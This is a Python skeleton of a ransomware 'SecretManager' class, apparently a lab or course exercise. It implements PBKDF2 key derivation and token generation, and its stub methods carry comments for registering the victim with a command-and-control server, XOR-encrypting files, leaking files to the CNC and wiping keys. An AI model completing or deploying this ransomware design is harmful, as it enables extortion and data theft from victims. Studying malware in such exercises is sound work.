from hashlib import sha256
import logging
import secrets
from os import path, urandom
from typing import List, Tuple
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

KDF_ITERATION_NUMBER = 48000
TOKEN_LENGTH = 16
SALT_LENGTH = 16
KEY_LENGTH = 16

class SecretManager:

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> None:
        self._salt = salt
        KDF = PBKDF2HMAC(algorithm = hashes.SHA256(),
                         length = KEY_LENGTH,
                         salt = self._salt,
                         iterations = KDF_ITERATION_NUMBER)
        self._key = KDF.derive(key)
        self._token = secrets.token_bytes(TOKEN_LENGTH) 
   
    def create(self) -> tuple[bytes, bytes, bytes]:
        return (self._key, self._salt, self._token)
    
    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes) -> None:
        # register the victim to the CNC
        raise NotImplemented()

    def setup(self) -> None:
        # main function to create crypto data and register malware to cnc
        raise NotImplemented()

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        raise NotImplemented()

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()
